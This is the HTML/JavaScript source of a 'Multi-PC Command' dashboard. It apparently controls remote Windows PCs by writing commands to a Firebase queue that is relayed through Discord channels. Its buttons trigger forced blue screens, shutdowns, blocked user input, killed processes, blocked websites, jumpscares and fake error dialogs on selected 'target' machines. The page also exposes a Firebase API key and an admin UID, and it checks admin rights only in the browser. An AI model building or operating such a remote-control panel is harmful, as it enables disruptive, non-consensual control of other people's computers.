<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-PC Control | Potkan</title>
    <style>
        /* (Keep your existing CSS styles perfectly intact) */
        :root { --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #3b82f6; --danger: #ef4444; --success: #22c55e; --warn: #eab308; }
        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        h1 { background: linear-gradient(135deg, var(--accent), #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.5rem; margin-bottom: 2rem; text-transform: uppercase; }
        
        /* AUTH BAR (New) */
        .auth-bar {
            width: 100%; max-width: 1200px; display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; color: #94a3b8; font-size: 0.9rem;
        }
        .logout-btn { padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; border-radius: 8px; cursor: pointer; transition: 0.2s; }
        .logout-btn:hover { background: rgba(255,255,255,0.2); }

        .pc-selector { width: 100%; max-width: 600px; margin-bottom: 30px; background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid var(--accent); text-align: center; }
        .pc-selector select { width: 100%; padding: 15px; font-size: 1.1rem; background: #0f172a; color: white; border: 1px solid #334155; border-radius: 8px; margin-top: 10px; }

        /* Dashboard hidden until PC selected */
        #mainDashboard { display: none; width: 100%; max-width: 1200px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        
        /* Your Card/Button CSS */
        .card { background: var(--card); padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .card-header { font-size: 1.2rem; font-weight: bold; margin-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
        .grid-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; color: white; background: #334155; width: 100%; }
        button:hover { filter: brightness(1.2); }
        .btn-danger { background: var(--danger); }
        .btn-success { background: var(--success); }
        .btn-warn { background: var(--warn); color: black; }
        .btn-info { background: var(--accent); }
        .btn-gray { background: #475569; }
        .full-width { grid-column: span 2; }

        /* LOGS CSS */
        .logs-container { width: 100%; max-width: 1200px; margin-top: 25px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-sizing: border-box; }
        .log-title { color: #94a3b8; font-size: 0.9rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
        .log-list { list-style: none; padding: 0; margin: 0; max-height: 200px; overflow-y: auto; }
        .log-item { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: monospace; font-size: 0.9rem; color: #ccc; display: flex; justify-content: space-between; }
        .log-item:last-child { border-bottom: none; }
        .log-time { color: #64748b; font-size: 0.8rem; }
        .log-cmd { color: var(--accent); font-weight: bold; }
    </style>
</head>
<body>

    <!-- AUTH BAR (Shows who is logged in) -->
    <div class="auth-bar">
        <span id="userDisplay">Logged in as: ...</span>
        <button class="logout-btn" onclick="logout()">Log Out</button>
    </div>

    <h1>üöÄ Multi-PC Command</h1>

    <!-- STEP 1: SELECT PC -->
    <div class="pc-selector">
        <h3>üéØ Select Target PC (Category)</h3>
        <select id="categorySelect" onchange="selectPC()">
            <option value="">üîÑ Loading PC List...</option>
        </select>
        <p id="targetStatus" style="margin-top:10px; color:#aaa; font-size:0.9rem;">Please select a PC to control.</p>
    </div>

    <!-- STEP 2: DASHBOARD -->
    <div id="mainDashboard" class="dashboard"> 
        
        <!-- POWER -->
        <div class="card">
            <div class="card-header">‚ö° Power</div>
            <div class="grid-buttons">
                <button class="btn-info" onclick="cmd('lock_pc')">üîí Lock</button>
                <button class="btn-warn" onclick="cmd('restart_pc')">üîÑ Restart</button>
                <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')">üõë Shutdown</button>
                <button class="btn-danger full-width" onclick="confirmAction('bsod')">üíÄ BSOD</button>
                <button class="btn-danger" onclick="toggleInput(true)">üö´ Block Input</button>
                <button class="btn-success" onclick="toggleInput(false)">‚úÖ Restore Input</button>
                <button class="btn-danger" onclick="askBlacklist()">‚ùå Blacklist App</button>
                <button class="btn-success" onclick="askWhitelist()">‚úÖ Whitelist App</button>
            </div>
        </div>

        <!-- MEDIA -->
        <div class="card">
            <div class="card-header">üîä Media</div>
            <div class="grid-buttons">
                <button class="btn-gray" onclick="cmd('mute')">üîá Mute</button>
                <button class="btn-success" onclick="cmd('unmute')">üîä Unmute</button>
                <button class="btn-info full-width" onclick="askTTS()">üó£Ô∏è Speak</button>
                <div class="full-width">
                    <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)" style="width:100%">
                </div>
            </div>
        </div>

        <!-- PRANKS -->
        <div class="card">
            <div class="card-header">üëª Fun</div>
            <div class="grid-buttons">
                <button class="btn-warn full-width" onclick="cmd('jumpscare')">üëª Jumpscare</button>
                <button class="btn-info full-width" onclick="askMsgBox()">üí¨ Fake Error</button>
                <button class="btn-success full-width" onclick="askURL()">üåê Open URL</button>
                <button class="btn-warn" onclick="askBlockURL()">üåê Block Site</button>
                <button class="btn-gray" onclick="askUnblockURL()">üîì Unblock Site</button>
            </div>
        </div>

        <!-- DISCORD -->
        <div class="card">
            <div class="card-header">üí¨ Communication</div>
            <button class="btn-info" onclick="cmd('ping_channel')">üèì Ping This PC</button>
            <p style="font-size:0.8rem; color:#aaa; margin-top:10px;">
                Commands sent to: <span id="activeChannelName" style="color:var(--accent)">None</span>
            </p>
        </div>

    </div>

    <!-- LOGS CONTAINER -->
    <div class="logs-container">
        <div class="log-title">Command History</div>
        <ul class="log-list" id="logList">
            <li class="log-item">
                <span class="log-cmd">System Ready</span>
                <span class="log-time">Now</span>
            </li>
        </ul>
    </div>

    <!-- SCRIPT -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        // ADDED AUTH MODULES
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
            authDomain: "potkan-5132c.firebaseapp.com",
            databaseURL: "https://potkan-5132c-default-rtdb.firebaseio.com/",
            projectId: "potkan-5132c",
            storageBucket: "potkan-5132c.firebasestorage.app",
            messagingSenderId: "1049909900706",
            appId: "1:1049909900706:web:f4d5b811a98760f0862efb"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); // START AUTH
        const db = getDatabase(app);
        const dbRef = ref(db);

        // --- SECURITY: ADMIN CHECK ---
        const ADMIN_UID = "sJSL8EjvFhMpoiD4yaAThWDKsf32"; // <--- CHANGE THIS TO YOUR UID

        onAuthStateChanged(auth, (user) => {
            if (user) {
                // If logged in, check if admin
                if (user.uid !== ADMIN_UID) {
                    window.location.href = "index.html"; // Kick non-admins
                } else {
                    document.getElementById('userDisplay').innerText = `Logged in as: ${user.email}`;
                }
            } else {
                // Not logged in at all
                window.location.href = "index.html"; 
            }
        });

        window.logout = function() {
            signOut(auth).then(() => {
                window.location.href = "index.html";
            });
        };

        // --- REST OF YOUR CODE (UNCHANGED) ---

        // GLOBAL VARIABLES
        window.currentTargetID = null; 
        window.currentPCName = "Unknown";
        let discordStructure = {};

        // 1. LOAD STRUCTURE
        get(child(dbRef, `discord_structure`)).then((snapshot) => {
            const select = document.getElementById('categorySelect');
            
            if (snapshot.exists()) {
                const fullData = snapshot.val();
                const discordStructure = fullData.structure || fullData; 
                const lastTime = fullData.last_updated || "Unknown Time";

                select.innerHTML = `<option value="">-- Select PC (Updated: ${lastTime}) --</option>`;

                for (const [serverName, categories] of Object.entries(discordStructure)) {
                    if(serverName === "last_updated") continue; 

                    const group = document.createElement('optgroup');
                    group.label = serverName;
                    
                    for (const [catName, channels] of Object.entries(categories)) {
                        const option = document.createElement('option');
                        option.value = JSON.stringify({server: serverName, category: catName}); 
                        option.innerText = `üñ•Ô∏è ${catName}`;
                        group.appendChild(option);
                    }
                    select.appendChild(group);
                }
            } else {
                select.innerHTML = '<option>No Data Found</option>';
            }
        });

        // 2. HANDLE SELECTION
        window.selectPC = function() {
            const select = document.getElementById('categorySelect');
            const val = select.value;
            const dashboard = document.getElementById('mainDashboard');
            const status = document.getElementById('targetStatus');
            const activeName = document.getElementById('activeChannelName');

            if (!val) {
                dashboard.style.display = "none";
                status.innerText = "Select a PC to continue.";
                return;
            }

            const data = JSON.parse(val);
            const server = data.server;
            const category = data.category;
            window.currentPCName = category;
            
            // Re-fetch structure to be safe (or use global var if you prefer)
            get(child(dbRef, `discord_structure`)).then((snap) => {
                const fullData = snap.val();
                const struct = fullData.structure || fullData;
                const channels = struct[server][category];
                
                let foundID = null;
                let foundName = "";
                const targetNames = ["remote-access", "ùï£ùïñùïûùï†ùï•ùïñ-ùïíùïîùïîùïñùï§ùï§", "cmd", "terminal"];
                
                for (const [id, name] of Object.entries(channels)) {
                    if (targetNames.includes(name.toLowerCase())) {
                        foundID = id;
                        foundName = name;
                        break;
                    }
                }

                if (foundID) {
                    window.currentTargetID = foundID;
                    dashboard.style.display = "grid"; 
                    status.innerText = `‚úÖ Connected to: ${category} (via #${foundName})`;
                    status.style.color = "#22c55e";
                    activeName.innerText = `#${foundName}`;
                    addLog(`Connected to PC: ${category}`);
                } else {
                    dashboard.style.display = "none";
                    status.innerText = `‚ùå Error: Could not find 'remote-access' channel in '${category}'.`;
                    status.style.color = "#ef4444";
                }
            });
        };

        // 3. LOGGING SYSTEM
        const logsRef = query(ref(db, 'logs'), limitToLast(10));
        onValue(logsRef, (snapshot) => {
            const list = document.getElementById('logList');
            list.innerHTML = ""; 
            if(snapshot.exists()) {
                const data = snapshot.val();
                Object.values(data).reverse().forEach(log => {
                    const li = document.createElement('li');
                    li.className = 'log-item';
                    const timeStr = new Date(log.timestamp).toLocaleTimeString();
                    li.innerHTML = `<span class="log-cmd">> ${log.message}</span><span class="log-time">${timeStr}</span>`;
                    list.appendChild(li);
                });
            }
        });

        function addLog(msg) {
            push(ref(db, 'logs'), { message: msg, timestamp: Date.now() });
        }

        // 4. COMMANDS
        window.cmd = function(type) {
            if(!window.currentTargetID) return alert("No Target Selected!");
            writeDB({ type: type, target_id: window.currentTargetID });
            addLog(`[${window.currentPCName}] Executed: ${type}`);
        };

        window.confirmAction = function(type) {
            if(confirm("Confirm dangerous action?")) cmd(type);
        };
        
        window.askTTS = function() {
            const t = prompt("Text:");
            if(t) {
                writeDB({type:'tts', text:t, target_id: window.currentTargetID});
                addLog(`[${window.currentPCName}] TTS: "${t}"`);
            }
        };

        window.askURL = function() {
            const u = prompt("URL:");
            if(u) {
                writeDB({type:'open_url', url:u, target_id: window.currentTargetID});
                addLog(`[${window.currentPCName}] Open URL`);
            }
        };

        window.askMsgBox = function() {
            const t = prompt("Message:");
            if(t) {
                writeDB({type:'msgbox', text:t, target_id: window.currentTargetID});
                addLog(`[${window.currentPCName}] MsgBox Sent`);
            }
        };

        window.setVolume = function(val) {
            if(!window.currentTargetID) return;
            writeDB({type:'volume', value:val, target_id: window.currentTargetID});
        };

        window.askBlockURL = function() {
            const d = prompt("Domain to block (e.g. facebook.com):");
            if(d) writeDB({type:'block_url', domain:d, target_id: window.currentTargetID});
        };

        window.askUnblockURL = function() {
            const d = prompt("Domain to unblock:");
            if(d) writeDB({type:'unblock_url', domain:d, target_id: window.currentTargetID});
        };

        window.askBlacklist = function() {
            const n = prompt("Process to kill (e.g. notepad.exe):");
            if(n) writeDB({type:'blacklist', name:n, target_id: window.currentTargetID});
        };

        window.toggleInput = function(block) {
            const type = block ? 'disable_input' : 'enable_input';
            writeDB({type: type, target_id: window.currentTargetID});
        };
        
        window.askWhitelist = function() {
            const n = prompt("Process to restore (e.g. notepad.exe):");
            if(n) {
                writeDB({type:'whitelist', name:n, target_id: window.currentTargetID});
                addLog(`Whitelisted: ${n}`);
            }
        };

        function writeDB(data) {
            data.timestamp = Date.now();
            set(ref(db, 'queue/pending'), data);
        };

    </script>
</body>
</html>
